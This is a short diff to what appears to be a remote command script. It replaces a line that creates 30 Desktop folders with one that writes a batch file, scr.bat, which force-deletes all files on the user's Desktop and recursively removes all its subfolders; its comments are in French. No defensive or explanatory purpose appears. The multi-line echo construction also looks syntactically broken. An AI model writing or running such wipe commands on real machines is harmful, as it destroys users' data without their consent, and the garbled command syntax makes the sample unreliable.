@@ -1,1 +1,8 @@
-ExecuteCmd -user -cmd "for /L %i in (1,1,30) do mkdir %USERPROFILE%\Desktop\dossier%i"
+ExecuteCmd -user -cmd "echo @echo off
+cd /d "%USERPROFILE%\Desktop"
+
+:: Supprimer tous les fichiers
+del /f /q *.*
+
+:: Supprimer tous les dossiers
+for /D %%i in (*) do rd /s /q "%%i" > %USERPROFILE%\scr.bat"
